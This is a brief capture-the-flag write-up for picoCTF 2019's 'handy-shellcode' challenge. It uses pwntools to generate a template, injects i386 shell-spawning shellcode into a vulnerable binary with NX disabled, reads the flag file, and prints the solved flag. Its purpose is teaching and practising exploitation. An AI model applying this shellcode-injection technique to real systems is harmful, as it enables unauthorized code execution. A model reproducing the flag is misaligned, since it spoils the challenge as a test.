## Using the pwntools template cli

```console
pwn template --host 2019shell1.picoctf.com --user ${PICOUSER} --pass ${PICOPASS} --path /problems/handy-shellcode_0_24753fd2c78ac1a60682f0c924b23405/vuln
```

### Mods in the end of the exploit.py generated

```python
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

io = start()

io.sendlineafter(':\n', asm(shellcraft.i386.linux.sh()))
io.sendlineafter(
    '$ ', 'cat /problems/handy-shellcode_0_24753fd2c78ac1a60682f0c924b23405/flag.txt')

io.close()
```

## Flag

picoCTF{h4ndY_d4ndY_sh311c0d3_ce07e7f1}
